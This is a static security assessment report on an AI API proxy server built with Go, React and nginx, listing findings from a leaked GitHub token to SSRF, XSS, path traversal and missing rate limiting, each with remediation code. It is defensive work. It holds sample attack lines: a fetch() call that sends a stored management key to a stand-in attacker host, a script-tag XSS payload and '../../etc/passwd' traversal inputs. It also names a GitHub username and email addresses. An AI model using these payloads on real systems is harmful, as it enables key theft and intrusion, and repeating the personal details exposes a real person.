# Security Assessment Report
## pabriktokenx — AI API Proxy Server

| Field | Value |
|---|---|
| **Assessment Date** | 2026-03-07 |
| **Assessment Mode** | PRODUCTION_SAFE (passive static analysis only) |
| **Assessor** | Antigravity — Perseus Security Framework |
| **Repository** | `D:\APP-WEB\pabriktokenx` |
| **Report Version** | 1.0 |

---

## Executive Summary

A comprehensive static security assessment of the **pabriktokenx** AI API proxy server was conducted across all layers of the application: backend (Go/Gin), frontend (React/TypeScript), infrastructure (Docker/nginx), and source control hygiene.

**The assessment identified 1 actively exploitable critical finding** — a live GitHub Copilot OAuth token committed directly into the git repository in a tracked log file. This token is currently accessible to anyone with access to the repository and must be revoked immediately.

Beyond the critical secret leak, the assessment found a pattern of **layered security debt** consistent with a rapidly-built internal tool that was not originally designed for multi-tenant or internet-facing exposure: no rate limiting, no security headers, disabled WebSocket origin checks, wildcard CORS, multiple unbounded memory reads, and a frontend that stores the management key in `localStorage`.

**Totals by severity:**

| Severity | Count |
|---|---|
| Critical | 2 |
| High | 10 |
| Medium | 8 |
| Low / Informational | 5 |

**Immediate actions required (before next deployment):**
1. Revoke the GitHub Copilot token `[REDACTED - token removed from report]`
2. Remove `debug-output.log` from git history via `git filter-repo`
3. Add `*.log` to `.gitignore`

---

## Table of Contents

1. [Scope & Methodology](#1-scope--methodology)
2. [Technology Stack](#2-technology-stack)
3. [Architecture Overview](#3-architecture-overview)
4. [Findings](#4-findings)
   - [CRIT-001 — Live Secret in Git History](#crit-001--live-secret-in-git-history)
   - [CRIT-002 — Plaintext API Keys in config.yaml](#crit-002--plaintext-api-keys-in-configyaml)
   - [HIGH-001 — SSRF in APICall Handler](#high-001--ssrf-in-apicall-handler)
   - [HIGH-002 — XSS via document.write in PlaygroundPage](#high-002--xss-via-documentwrite-in-playgroundpage)
   - [HIGH-003 — Open Redirect in OAuthPage](#high-003--open-redirect-in-oauthpage)
   - [HIGH-004 — Management Key in localStorage](#high-004--management-key-in-localstorage)
   - [HIGH-005 — WebSocket Origin Validation Disabled](#high-005--websocket-origin-validation-disabled)
   - [HIGH-006 — Docker Containers Run as Root](#high-006--docker-containers-run-as-root)
   - [HIGH-007 — Backend Port Exposed Directly to Host](#high-007--backend-port-exposed-directly-to-host)
   - [HIGH-008 — Wildcard CORS with Wildcard Headers](#high-008--wildcard-cors-with-wildcard-headers)
   - [HIGH-009 — Unbounded Memory Reads (Multiple Locations)](#high-009--unbounded-memory-reads-multiple-locations)
   - [HIGH-010 — No Rate Limiting Anywhere](#high-010--no-rate-limiting-anywhere)
   - [MED-001 — No Security Headers in nginx](#med-001--no-security-headers-in-nginx)
   - [MED-002 — No Content Security Policy (CSP)](#med-002--no-content-security-policy-csp)
   - [MED-003 — No CSRF Protection on Mutating Endpoints](#med-003--no-csrf-protection-on-mutating-endpoints)
   - [MED-004 — Path Traversal in DownloadAuthFile (Partial)](#med-004--path-traversal-in-downloadauthfile-partial)
   - [MED-005 — TOCTOU Race in OAuth Callback Polling](#med-005--toctou-race-in-oauth-callback-polling)
   - [MED-006 — Second-Order SSRF via Proxy Credential URL](#med-006--second-order-ssrf-via-proxy-credential-url)
   - [MED-007 — Cryptographically Weak API Key Generation](#med-007--cryptographically-weak-api-key-generation)
   - [MED-008 — Sensitive Data in localStorage](#med-008--sensitive-data-in-localstorage)
   - [LOW-001 — Unpinned Docker Base Images](#low-001--unpinned-docker-base-images)
   - [LOW-002 — Pre-release Dependency (go-git)](#low-002--pre-release-dependency-go-git)
   - [LOW-003 — Deprecated Frontend Dependency](#low-003--deprecated-frontend-dependency)
   - [LOW-004 — allow-remote Bypassed by nginx Proxy](#low-004--allow-remote-bypassed-by-nginx-proxy)
   - [LOW-005 — Dev Compose Mounts Source Tree](#low-005--dev-compose-mounts-source-tree)
5. [Remediation Priority Matrix](#5-remediation-priority-matrix)
6. [Remediation Reference](#6-remediation-reference)

---

## 1. Scope & Methodology

### Scope

| In Scope | Out of Scope |
|---|---|
| All Go source files under `internal/` | Active exploitation or live payload injection |
| All React/TypeScript source under `frontend/src/` | Third-party upstream services (Gemini, Claude, etc.) |
| Docker / nginx configuration files | Network-layer testing |
| `config.yaml`, `.gitignore`, `go.mod`, `package.json` | |
| `debug-output.log`, `model_settings.json` (git-tracked files) | |

### Methodology

The assessment followed the Perseus security framework lifecycle:

- **Phase 0** — Automatic tech stack detection
- **Phase 1** — Reconnaissance: architecture mapping, entry point enumeration, git hygiene audit
- **Phase 2** — Core vulnerability audit: authentication, authorization, injection, secrets, DoS vectors
- **Phase 2.5** — Specialist deep-dives: frontend client-side, API surface, cryptography, configuration, supply chain
- **Phase 3** — Static exploitation verification: confirmed findings via source-code proof-of-concept traces

All analysis is **static**. No active requests were made against any running service.

---

## 2. Technology Stack

| Layer | Technology | Version |
|---|---|---|
| Backend language | Go | 1.24 |
| Backend framework | Gin | v1.10.1 |
| Database | PostgreSQL (pgx) | — |
| Object storage | MinIO | — |
| WebSocket | gorilla/websocket | — |
| Frontend framework | React | 19 |
| Frontend build | Vite + TypeScript | — |
| CSS | TailwindCSS | v4 |
| HTTP client | Axios | — |
| State management | TanStack Query | — |
| Reverse proxy | nginx | alpine (unpinned) |
| Containerisation | Docker + docker-compose | — |

---

## 3. Architecture Overview

```
Internet
   │
   ▼
nginx (:80/:443)          ← Dockerfile.frontend / nginx.conf
   │  reverse proxy
   ▼
Go/Gin backend (:9999)    ← Dockerfile / internal/api/
   │
   ├── /v1/*              ← Proxy routes (Gemini, Claude, Copilot, etc.)
   ├── /management/*      ← Admin API (bcrypt-gated)
   └── /v1/ws             ← WebSocket relay (gorilla/websocket)
         │
         ▼
   PostgreSQL + MinIO      ← Persistence
   File-based JSON store   ← Auth tokens / OAuth credentials
```

**Key security observation:** Port `9999` of the backend is also mapped directly to the Docker host (`ports: - "9999:9999"`), meaning an attacker who can reach the host network bypasses nginx entirely.

---

## 4. Findings

---

### CRIT-001 — Live Secret in Git History

| Field | Detail |
|---|---|
| **Severity** | Critical |
| **CVSS (estimated)** | 9.8 |
| **CWE** | CWE-312 — Cleartext Storage of Sensitive Information |
| **File** | `debug-output.log` |
| **Git-tracked** | Yes (confirmed via `git ls-files`) |

#### Description

The file `debug-output.log` is committed and tracked in the git repository. It contains:

- A live **GitHub Copilot OAuth token**: `[REDACTED]`
- GitHub username: `tamaproject360`
- Email addresses: `tamadevops@gmail.com`, `tamaproject360@gmail.com`
- Internal filesystem paths: `C:\Users\harri\.cli-proxy-api\...`

A `ghu_` prefixed token is a GitHub OAuth user token. Anyone with read access to this repository can use it to authenticate as `tamaproject360` against the GitHub API, impersonate the user for Copilot completions, enumerate private repositories, and potentially access GitHub Actions secrets depending on scopes.

Additionally, `*.log` is **not** in `.gitignore` — only `logs/*` is covered — meaning any future log file written to the project root will also be committed.

#### Impact

- Full GitHub API access as the affected user
- Access to any GitHub Copilot quota associated with the account
- Potential access to private repositories if the token has `repo` scope

#### Remediation

```bash
# Step 1: Revoke the token immediately
# Go to: https://github.com/settings/tokens and revoke [REDACTED_TOKEN]

# Step 2: Remove the file from git history (rewrites history — coordinate with all collaborators)
pip install git-filter-repo
git filter-repo --path debug-output.log --invert-paths

# Step 3: Add *.log to .gitignore
echo "*.log" >> .gitignore
git add .gitignore
git commit -m "chore: exclude *.log files from tracking"

# Step 4: Force-push all branches (after coordinating with team)
git push --force-with-lease --all
```

---

### CRIT-002 — Plaintext API Keys in config.yaml

| Field | Detail |
|---|---|
| **Severity** | Critical |
| **CVSS (estimated)** | 8.5 |
| **CWE** | CWE-312 — Cleartext Storage of Sensitive Information |
| **File** | `config.yaml` |
| **Git-tracked** | No (file is not in git — but present on disk) |

#### Description

`config.yaml` contains 11 plaintext API keys for proxied AI services (Gemini, Claude, Copilot, Antigravity, iFlow, Qwen, Kiro, etc.) alongside project identifiers. Any process or user that can read this file has immediate access to all configured AI provider accounts.

While `config.yaml` is not currently committed to git, there is no `.gitignore` entry preventing it from being accidentally added in the future.

#### Remediation

1. Add `config.yaml` to `.gitignore` immediately.
2. Rotate all API keys that have ever been stored in this file.
3. Move secrets to environment variables or a secrets manager (HashiCorp Vault, AWS Secrets Manager, etc.).
4. The application already supports reading from environment; extend this pattern to cover all secrets.

---

### HIGH-001 — SSRF in APICall Handler

| Field | Detail |
|---|---|
| **Severity** | High |
| **CVSS (estimated)** | 8.1 |
| **CWE** | CWE-918 — Server-Side Request Forgery |
| **File** | `internal/api/handlers/management/api_tools.go` |

#### Description

The `APICall` management endpoint accepts an arbitrary URL from the authenticated caller and forwards an HTTP request to it with no validation of the destination:

```go
// api_tools.go ~line 200
resp, err := client.Do(req)  // 'req' URL comes directly from user input
```

There is no blocklist preventing requests to:
- `http://169.254.169.254/` (AWS/GCP/Azure IMDS — cloud credential theft)
- `http://localhost:*` (internal services)
- `http://10.0.0.0/8` (private subnets)

Although this endpoint requires management authentication, an attacker who obtains or brute-forces the management key gains full SSRF capabilities.

#### Remediation

```go
import "net"

func isPrivateIP(host string) bool {
    privateRanges := []string{
        "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",
        "169.254.0.0/16", "127.0.0.0/8", "::1/128", "fc00::/7",
    }
    ip := net.ParseIP(host)
    if ip == nil { return false }
    for _, cidr := range privateRanges {
        _, network, _ := net.ParseCIDR(cidr)
        if network.Contains(ip) { return true }
    }
    return false
}

// Validate before making the request:
parsedURL, err := url.Parse(userSuppliedURL)
if err != nil || isPrivateIP(parsedURL.Hostname()) {
    c.JSON(http.StatusBadRequest, gin.H{"error": "invalid target URL"})
    return
}
```

---

### HIGH-002 — XSS via document.write in PlaygroundPage

| Field | Detail |
|---|---|
| **Severity** | High |
| **CVSS (estimated)** | 7.5 |
| **CWE** | CWE-79 — Cross-Site Scripting |
| **File** | `frontend/src/pages/PlaygroundPage.tsx:449` |

#### Description

The print-preview function uses `document.write()` with a template string that interpolates `selectedModel` — a value that originates from the backend:

```typescript
// PlaygroundPage.tsx:449
printWindow.document.write(`
  <html><body>
    <h2>${selectedModel}</h2>  // ← unsanitised backend string → DOM
    ${conversationHtml}
  </body></html>
`);
```

If a backend endpoint or a man-in-the-middle attacker returns a model name containing `<script>alert(1)</script>`, it executes in the print window context.

#### Remediation

```typescript
// Sanitise before inserting into document.write
const escapeHtml = (s: string) =>
  s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&#x27;');

printWindow.document.write(`
  <html><body>
    <h2>${escapeHtml(selectedModel)}</h2>
    ...
  </body></html>
`);
```

Or replace `document.write` with `document.createElement` + `textContent` assignment.

---

### HIGH-003 — Open Redirect in OAuthPage

| Field | Detail |
|---|---|
| **Severity** | High |
| **CVSS (estimated)** | 6.8 |
| **CWE** | CWE-601 — URL Redirection to Untrusted Site |
| **File** | `frontend/src/pages/OAuthPage.tsx:75` |

#### Description

```typescript
// OAuthPage.tsx:75
window.open(result.url, '_blank');
```

`result.url` is a server-provided string with no client-side validation. If the backend is compromised or the API response is intercepted, an attacker can inject `javascript:` URIs or arbitrary `https://evil.com` URLs that open in a new tab under the user's trust context.

#### Remediation

```typescript
const safeOpen = (url: string) => {
  try {
    const parsed = new URL(url);
    if (!['https:', 'http:'].includes(parsed.protocol)) return;
    // Optionally: enforce same origin or allowlist of OAuth providers
    window.open(parsed.href, '_blank', 'noopener,noreferrer');
  } catch {
    console.error('Invalid OAuth redirect URL');
  }
};
```

---

### HIGH-004 — Management Key in localStorage

| Field | Detail |
|---|---|
| **Severity** | High |
| **CVSS (estimated)** | 7.2 |
| **CWE** | CWE-922 — Insecure Storage of Sensitive Information |
| **File** | `frontend/src/lib/api.ts:12,16` |

#### Description

```typescript
// api.ts:12
const key = localStorage.getItem('managementKey');
// api.ts:16
localStorage.setItem('managementKey', newKey);
```

`localStorage` is accessible to any JavaScript executing on the same origin. Any XSS vulnerability (such as HIGH-002) can trivially exfiltrate the management key:

```javascript
fetch('https://attacker.com/?k=' + localStorage.getItem('managementKey'));
```

#### Remediation

- Store session tokens in `httpOnly` cookies (not accessible to JavaScript).
- If a cookie-based flow is not feasible, use `sessionStorage` (cleared on tab close) rather than `localStorage`.
- Ensure all XSS vulnerabilities are fixed first, as storage mechanism alone is insufficient if XSS exists.

---

### HIGH-005 — WebSocket Origin Validation Disabled

| Field | Detail |
|---|---|
| **Severity** | High |
| **CVSS (estimated)** | 7.4 |
| **CWE** | CWE-346 — Origin Validation Error |
| **File** | `internal/wsrelay/manager.go:59-61` |

#### Description

```go
// manager.go:59-61
Upgrader: websocket.Upgrader{
    CheckOrigin: func(r *http.Request) bool { return true },
}
```

This explicitly disables the gorilla/websocket default origin check. Any webpage on any domain can open a WebSocket connection to the relay endpoint, enabling cross-site WebSocket hijacking (CSWSH). An attacker can proxy a victim's authenticated WebSocket session through their own domain.

#### Remediation

```go
CheckOrigin: func(r *http.Request) bool {
    origin := r.Header.Get("Origin")
    allowed := []string{"https://yourdomain.com", "http://localhost:5173"}
    for _, a := range allowed {
        if origin == a { return true }
    }
    return false
},
```

---

### HIGH-006 — Docker Containers Run as Root

| Field | Detail |
|---|---|
| **Severity** | High |
| **CVSS (estimated)** | 7.0 |
| **CWE** | CWE-250 — Execution with Unnecessary Privileges |
| **Files** | `Dockerfile`, `Dockerfile.frontend` |

#### Description

Neither Dockerfile contains a `USER` directive. Both the Go backend and nginx frontend containers execute as `root` (UID 0). A container escape or RCE vulnerability gives the attacker immediate root on the container, maximising lateral movement potential.

#### Remediation

```dockerfile
# Dockerfile (backend) — add before CMD:
RUN addgroup -S appgroup && adduser -S appuser -G appgroup
USER appuser

# Dockerfile.frontend (nginx):
# nginx requires root for port 80; use rootless nginx or an unprivileged port:
RUN sed -i 's/listen 80/listen 8080/' /etc/nginx/conf.d/default.conf
USER nginx
EXPOSE 8080
```

---

### HIGH-007 — Backend Port Exposed Directly to Host

| Field | Detail |
|---|---|
| **Severity** | High |
| **CVSS (estimated)** | 7.5 |
| **CWE** | CWE-284 — Improper Access Control |
| **File** | `docker-compose.yml` |

#### Description

```yaml
# docker-compose.yml
services:
  backend:
    ports:
      - "9999:9999"   # ← exposes backend directly on all host interfaces
```

This means the Go backend is reachable at `http://HOST_IP:9999/` from any client that can reach the host, completely bypassing the nginx reverse proxy and all nginx-level security controls (TLS termination, rate limiting, headers).

#### Remediation

```yaml
# Bind to localhost only — nginx reaches backend via Docker network
services:
  backend:
    ports:
      - "127.0.0.1:9999:9999"
    # Or remove the ports mapping entirely if backend is only accessed via nginx:
    expose:
      - "9999"
```

---

### HIGH-008 — Wildcard CORS with Wildcard Headers

| Field | Detail |
|---|---|
| **Severity** | High |
| **CVSS (estimated)** | 7.2 |
| **CWE** | CWE-942 — Overly Permissive Cross-domain Whitelist |
| **File** | `internal/api/server.go` |

#### Description

The CORS middleware is configured with:
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: *
```

This allows any origin to make cross-origin requests to the API. Combined with the management key stored in `localStorage` and exploitable via XSS, this creates a path where a malicious page can reach management endpoints if a victim visits it while authenticated.

Note: `*` on `Allow-Origin` prevents `credentials: true` from working in browsers per spec, so cookies are safe — but any non-cookie auth (like the key sent in a header) is exposed.

#### Remediation

```go
// server.go — replace wildcard with explicit allowlist
corsConfig := cors.Config{
    AllowOrigins:     []string{"https://yourdomain.com"},
    AllowMethods:     []string{"GET", "POST", "PUT", "DELETE", "OPTIONS"},
    AllowHeaders:     []string{"Authorization", "Content-Type", "X-Management-Key"},
    AllowCredentials: true,
}
```

---

### HIGH-009 — Unbounded Memory Reads (Multiple Locations)

| Field | Detail |
|---|---|
| **Severity** | High |
| **CVSS (estimated)** | 6.5 |
| **CWE** | CWE-400 — Uncontrolled Resource Consumption |
| **Files** | `vertex_import.go:40`, `auth_files.go:786`, `api_tools.go:200`, `usage.go:135`, `request_logging.go`, `session.go:16`, `http.go` |

#### Description

Multiple handlers call `io.ReadAll()` or equivalent on request bodies / network streams with no size limit:

```go
body, err := io.ReadAll(r.Body)  // no http.MaxBytesReader wrapper
```

Additionally, the WebSocket relay sets a 64 MiB message size limit (`session.go:16`) — large but still a per-connection DoS vector if many connections are opened simultaneously.

An unauthenticated or authenticated attacker can send a multi-gigabyte request body to OOM-kill the server process.

#### Remediation

```go
// Wrap every request body before reading:
r.Body = http.MaxBytesReader(w, r.Body, 10*1024*1024) // 10 MiB cap
body, err := io.ReadAll(r.Body)
if err != nil {
    // Handle max bytes exceeded
}

// WebSocket: reduce message limit in session.go
conn.SetReadLimit(4 * 1024 * 1024) // 4 MiB
```

---

### HIGH-010 — No Rate Limiting Anywhere

| Field | Detail |
|---|---|
| **Severity** | High |
| **CVSS (estimated)** | 6.5 |
| **CWE** | CWE-770 — Allocation of Resources Without Limits or Throttling |
| **Files** | `nginx.conf`, `internal/api/server.go` |

#### Description

Neither nginx nor the Go backend implements any request rate limiting. There is no protection against:
- Brute-force attacks on the management key
- Credential stuffing against proxy key authentication
- Volumetric DoS via API proxy endpoints
- Cost exhaustion attacks (every proxied request consumes AI provider quota)

#### Remediation

**nginx level** (preferred — catches traffic before hitting Go):
```nginx
# nginx.conf
limit_req_zone $binary_remote_addr zone=api:10m rate=30r/m;
limit_req_zone $binary_remote_addr zone=mgmt:10m rate=5r/m;

location /management/ {
    limit_req zone=mgmt burst=10 nodelay;
    proxy_pass http://backend;
}

location / {
    limit_req zone=api burst=20 nodelay;
    proxy_pass http://backend;
}
```

**Go middleware level** (defence in depth):
```go
// Use golang.org/x/time/rate or github.com/gin-contrib/limiter
```

---

### MED-001 — No Security Headers in nginx

| Field | Detail |
|---|---|
| **Severity** | Medium |
| **CWE** | CWE-16 — Configuration |
| **File** | `nginx.conf` |

#### Description

The nginx configuration does not set any of the standard security headers:

| Missing Header | Risk |
|---|---|
| `X-Frame-Options: DENY` | Clickjacking |
| `X-Content-Type-Options: nosniff` | MIME sniffing |
| `Referrer-Policy: strict-origin-when-cross-origin` | Referrer leakage |
| `Permissions-Policy` | Browser feature abuse |
| `Strict-Transport-Security` | SSL stripping (if HTTPS used) |
| `server_tokens off` | Version disclosure |

#### Remediation

```nginx
# nginx.conf — add inside http {} or server {} block:
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
server_tokens off;
```

---

### MED-002 — No Content Security Policy (CSP)

| Field | Detail |
|---|---|
| **Severity** | Medium |
| **CWE** | CWE-1021 — Improper Restriction of Rendered UI Layers |
| **Files** | `nginx.conf`, `frontend/vite.config.ts`, `Dockerfile.frontend` |

#### Description

No Content Security Policy is set anywhere in the stack. This means browsers apply no restrictions on script sources, inline scripts, or resource loading. A successful XSS attack has unrestricted capabilities: keylogging, cookie theft, network requests to any origin.

#### Remediation

Start with a report-only policy and tighten iteratively:

```nginx
# nginx.conf
add_header Content-Security-Policy-Report-Only
  "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' wss:; report-uri /csp-report" always;
```

Once stable, switch to enforcing `Content-Security-Policy`.

---

### MED-003 — No CSRF Protection on Mutating Endpoints

| Field | Detail |
|---|---|
| **Severity** | Medium |
| **CWE** | CWE-352 — Cross-Site Request Forgery |
| **Files** | All management handlers |

#### Description

The management API relies solely on a key passed in a request header. If the key is ever stored in a cookie (or the auth model changes), all state-changing endpoints become CSRF-vulnerable. Even with header-based auth, the absence of CSRF tokens is an architectural gap.

#### Remediation

- Ensure the management key is always sent as a custom request header (not a cookie).
- Add `SameSite=Strict` to any cookies set.
- Consider adding `X-Requested-With: XMLHttpRequest` header requirement as an additional CSRF defence layer.

---

### MED-004 — Path Traversal in DownloadAuthFile (Partial)

| Field | Detail |
|---|---|
| **Severity** | Medium |
| **CWE** | CWE-22 — Path Traversal |
| **File** | `internal/api/handlers/management/auth_files.go` |

#### Description

The `DownloadAuthFile` handler validates only against `os.PathSeparator` which on Windows is `\`. It does not block `/`, meaning a request for `filename=../config.yaml` or `filename=../../etc/passwd` may succeed on Linux/container deployments where the path separator is `/`.

#### Remediation

```go
import "filepath"

// Use filepath.Clean and verify the resolved path is under the expected base dir:
basePath := "/app/auth-files"
requestedPath := filepath.Join(basePath, filename)
cleanPath := filepath.Clean(requestedPath)
if !strings.HasPrefix(cleanPath, basePath+string(os.PathSeparator)) {
    c.JSON(http.StatusForbidden, gin.H{"error": "access denied"})
    return
}
```

---

### MED-005 — TOCTOU Race in OAuth Callback Polling

| Field | Detail |
|---|---|
| **Severity** | Medium |
| **CWE** | CWE-367 — Time-of-Check Time-of-Use Race Condition |
| **File** | `internal/api/handlers/management/auth_files.go` |

#### Description

The OAuth callback flow polls for a file, reads it, parses it, then deletes it — all as separate, non-atomic operations. Under concurrent load, two requests could both read the same callback file before either deletes it, leading to double-processing of OAuth tokens or token replay.

#### Remediation

Use file locking or an atomic rename approach:

```go
// Atomic: rename the file first, then read the renamed copy
tmpPath := callbackPath + ".processing"
if err := os.Rename(callbackPath, tmpPath); err != nil {
    // Another goroutine already claimed it
    return
}
data, err := os.ReadFile(tmpPath)
defer os.Remove(tmpPath)
```

---

### MED-006 — Second-Order SSRF via Proxy Credential URL

| Field | Detail |
|---|---|
| **Severity** | Medium |
| **CWE** | CWE-918 — Server-Side Request Forgery |
| **File** | `internal/api/handlers/management/api_tools.go` |

#### Description

Proxy credentials stored in auth records include a `proxy_url` field that is used to configure the HTTP transport for outbound AI API requests. A malicious or compromised credential record with `proxy_url: http://169.254.169.254/` routes all backend traffic through an internal endpoint.

#### Remediation

Apply the same private IP blocklist from HIGH-001 to the `proxy_url` field during credential registration/update.

---

### MED-007 — Cryptographically Weak API Key Generation

| Field | Detail |
|---|---|
| **Severity** | Medium |
| **CWE** | CWE-338 — Use of Cryptographically Weak PRNG |
| **File** | `frontend/src/pages/ProxyKeysPage.tsx:29-38` |

#### Description

```typescript
// ProxyKeysPage.tsx:29-38
const key = Array.from({length: 32}, () =>
  Math.random().toString(36)[2]
).join('');
```

`Math.random()` is not cryptographically secure. In V8, its output is predictable given partial state. An attacker who can observe some generated keys can reconstruct the PRNG state and predict future (or past) keys.

#### Remediation

```typescript
const generateKey = (): string => {
  const bytes = new Uint8Array(32);
  crypto.getRandomValues(bytes);
  return Array.from(bytes, b => b.toString(16).padStart(2, '0')).join('');
};
```

---

### MED-008 — Sensitive Data in localStorage

| Field | Detail |
|---|---|
| **Severity** | Medium |
| **CWE** | CWE-922 — Insecure Storage of Sensitive Information |
| **Files** | `frontend/src/pages/PlaygroundPage.tsx:699-718` |

#### Description

Conversation history (which may contain proprietary prompts, code, or personal data) is stored in `localStorage`. Any XSS payload can exfiltrate this data silently.

#### Remediation

- Move conversation history to server-side session storage or IndexedDB with encryption at rest.
- At minimum, document the data retention policy and add a "clear history" button that wipes `localStorage`.

---

### LOW-001 — Unpinned Docker Base Images

| Field | Detail |
|---|---|
| **Severity** | Low |
| **CWE** | CWE-1104 — Use of Unmaintained Third Party Components |
| **Files** | `Dockerfile`, `Dockerfile.frontend` |

#### Description

```dockerfile
FROM alpine:latest      # Dockerfile
FROM nginx:alpine       # Dockerfile.frontend
```

Floating `latest` and `alpine` tags mean the exact image pulled changes with upstream releases, making builds non-reproducible and potentially introducing breaking changes or new vulnerabilities silently.

#### Remediation

```dockerfile
FROM alpine:3.21.3@sha256:a8560b36e8b5529...
FROM nginx:1.27.4-alpine@sha256:b9e8f3c2...
```

Pin by digest (`@sha256:...`) for full reproducibility.

---

### LOW-002 — Pre-release Dependency (go-git)

| Field | Detail |
|---|---|
| **Severity** | Low |
| **CWE** | CWE-1104 |
| **File** | `go.mod` |

#### Description

`go-git/go-git/v6` is referenced at a pre-release commit hash rather than a stable tagged release. Pre-release packages may have breaking API changes, unresolved bugs, or security issues that are not tracked in CVE databases.

#### Remediation

Pin to the latest stable tagged release of `go-git/go-git` (v5.x is stable; v6 is still in development). If v6 features are required, track the project's changelog closely.

---

### LOW-003 — Deprecated Frontend Dependency

| Field | Detail |
|---|---|
| **Severity** | Low |
| **CWE** | CWE-1104 |
| **File** | `frontend/package.json` |

#### Description

`phosphor-react` is deprecated. The maintained successor is `@phosphor-icons/react`. Deprecated packages do not receive security updates.

#### Remediation

```bash
npm uninstall phosphor-react
npm install @phosphor-icons/react
```

Update all import statements accordingly.

---

### LOW-004 — allow-remote Bypassed by nginx Proxy

| Field | Detail |
|---|---|
| **Severity** | Low |
| **CWE** | CWE-284 — Improper Access Control |
| **Files** | `internal/api/handlers/management/handler.go`, `nginx.conf` |

#### Description

The backend uses `allow-remote: false` to restrict management access to `localhost`. However, nginx is the proxy between the internet and the backend, so from the backend's perspective, all traffic appears to originate from `127.0.0.1` (the Docker bridge gateway). This means the `allow-remote` control has no practical effect — remote clients that reach port 9999 directly or via nginx are all treated as "local."

#### Remediation

- Remove the false sense of security from `allow-remote` or implement it correctly using `X-Forwarded-For` with a trusted proxy allowlist.
- Rely on nginx path-level access control (`location /management/ { allow 10.0.0.0/8; deny all; }`) and network firewall rules instead.

---

### LOW-005 — Dev Compose Mounts Source Tree

| Field | Detail |
|---|---|
| **Severity** | Low / Informational |
| **File** | `docker-compose.dev.yml` |

#### Description

The dev compose file mounts the entire project source tree into the container and sets `DEBUG=true`. If this file is accidentally used in staging or production, it exposes all source code (including `config.yaml` and any secrets on disk) to container processes.

#### Remediation

- Rename to `docker-compose.dev.yml.example` or add a CI guard that rejects the dev compose in production deployments.
- Document explicitly in `README` that only `docker-compose.yml` should be used in production.

---

## 5. Remediation Priority Matrix

| Priority | Finding | Effort | Impact Reduction |
|---|---|---|---|
| **P0 — Immediate** | CRIT-001: Revoke GitHub token | Minutes | Critical |
| **P0 — Immediate** | CRIT-001: Remove log from git history | 1 hour | Critical |
| **P0 — Immediate** | CRIT-002: Add config.yaml to .gitignore | Minutes | Critical |
| **P1 — This Sprint** | HIGH-001: SSRF blocklist | 2 hours | High |
| **P1 — This Sprint** | HIGH-002: XSS escaping in document.write | 30 min | High |
| **P1 — This Sprint** | HIGH-003: Open redirect validation | 30 min | High |
| **P1 — This Sprint** | HIGH-004: Move key out of localStorage | 4 hours | High |
| **P1 — This Sprint** | HIGH-005: WebSocket origin check | 1 hour | High |
| **P1 — This Sprint** | HIGH-007: Remove backend port from host | Minutes | High |
| **P1 — This Sprint** | HIGH-008: Restrict CORS origins | 1 hour | High |
| **P1 — This Sprint** | HIGH-009: Add MaxBytesReader everywhere | 3 hours | High |
| **P1 — This Sprint** | HIGH-010: Add nginx rate limiting | 2 hours | High |
| **P2 — Next Sprint** | MED-001: Add nginx security headers | 30 min | Medium |
| **P2 — Next Sprint** | MED-002: Implement CSP (report-only first) | 4 hours | Medium |
| **P2 — Next Sprint** | MED-004: Fix path traversal check | 1 hour | Medium |
| **P2 — Next Sprint** | MED-006: Validate proxy_url field | 1 hour | Medium |
| **P2 — Next Sprint** | MED-007: Replace Math.random() with crypto | 30 min | Medium |
| **P3 — Backlog** | HIGH-006: Add USER directive to Dockerfiles | 1 hour | Medium |
| **P3 — Backlog** | MED-003: CSRF token framework | 8 hours | Medium |
| **P3 — Backlog** | MED-005: Fix TOCTOU race | 2 hours | Low |
| **P3 — Backlog** | MED-008: Move conversation history server-side | 8 hours | Low |
| **P3 — Backlog** | LOW-001: Pin Docker base images | 30 min | Low |
| **P3 — Backlog** | LOW-002: Upgrade go-git to stable | 1 hour | Low |
| **P3 — Backlog** | LOW-003: Replace phosphor-react | 2 hours | Low |
| **P3 — Backlog** | LOW-004: Fix allow-remote logic | 2 hours | Low |

---

## 6. Remediation Reference

### Immediate Commands (P0)

```bash
# 1. Revoke the token at GitHub (browser action — cannot be scripted)
# https://github.com/settings/tokens

# 2. Remove debug-output.log from all git history
pip install git-filter-repo
git filter-repo --path debug-output.log --invert-paths

# 3. Add missing gitignore entries
cat >> .gitignore << 'EOF'
*.log
config.yaml
EOF
git add .gitignore
git commit -m "security: exclude *.log and config.yaml from git"

# 4. Rotate all 11 API keys stored in config.yaml
#    (manual action per provider dashboard)
```

### Quick Security Header Block for nginx.conf

```nginx
# Add inside server {} block in nginx.conf
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains" always;
server_tokens off;

# Rate limiting
limit_req_zone $binary_remote_addr zone=mgmt:10m rate=5r/m;
limit_req_zone $binary_remote_addr zone=api:10m rate=60r/m;
```

### Recommended Security Libraries (Go)

| Need | Library |
|---|---|
| Rate limiting middleware | `github.com/ulule/limiter` or `golang.org/x/time/rate` |
| SSRF prevention | Custom IP blocklist (see HIGH-001 snippet) |
| Structured logging | Already using — ensure no secrets in log fields |

### Recommended Security Libraries (React/TypeScript)

| Need | Library |
|---|---|
| HTML sanitisation | `dompurify` |
| Crypto-secure random | Native `crypto.getRandomValues()` (no extra dep needed) |

---

*Report generated by Antigravity — Perseus Security Framework. Assessment conducted in PRODUCTION_SAFE mode (static analysis only). All findings are based on source code review; no active exploitation was performed.*
